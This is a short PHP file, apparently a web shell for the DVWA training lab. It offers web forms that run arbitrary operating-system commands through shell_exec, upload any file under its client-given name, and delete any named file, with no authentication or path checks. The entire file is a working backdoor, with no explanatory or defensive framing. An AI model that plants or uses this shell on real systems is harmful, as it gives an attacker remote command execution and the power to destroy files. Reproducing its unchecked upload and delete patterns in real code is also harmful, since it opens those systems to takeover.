<?php

$DVWA_ROOT = "../../";

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}

if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $filename = $file['name'];
    $tmp_path = $file['tmp_name'];
    $destination = $DVWA_ROOT . "hackable/uploads/" . $filename;
    
    if (move_uploaded_file($tmp_path, $destination)) {
        echo "File uploaded successfully.";
    } else {
        echo "Failed to upload file.";
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    $path = $DVWA_ROOT . "hackable/uploads/" . $file;
    
    if (unlink($path)) {
        echo "File deleted successfully.";
    } else {
        echo "Failed to delete file." . $path;
    }
}

?>

<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<form method="GET">
    <input type="text" name="delete" placeholder="Enter file name to delete">
    <input type="submit" value="Delete">
</form>


